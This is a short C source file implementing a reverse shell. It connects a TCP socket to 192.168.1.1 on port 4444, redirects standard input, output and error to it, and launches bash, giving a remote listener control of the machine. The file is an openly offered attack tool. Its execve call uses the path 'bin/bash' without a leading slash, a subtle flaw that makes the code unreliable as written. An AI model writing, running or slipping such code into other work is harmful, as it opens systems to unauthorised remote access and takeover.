/* Target machine (TM) shell will hit back at the attacking machine shell (AM).
AM will mhave a listener port to detect TM calls.

Author: Lochlan Denholm MAR, 2020

*/
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int sockt;
    int port = 4444;
    struct sockaddr_in reverseSockAddr;

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    reverseSockAddr.sin_family = AF_INET;
    // convert to network byte
    reverseSockAddr.sin_port = htons(port);
    reverseSockAddr.sin_addr.s_addr = inet_addr("192.168.1.1");

    connect(sockt, (struct sockaddr *) &reverseSockAddr,
    sizeof(reverseSockAddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("bin/bash", argv, NULL);

    return 0;
}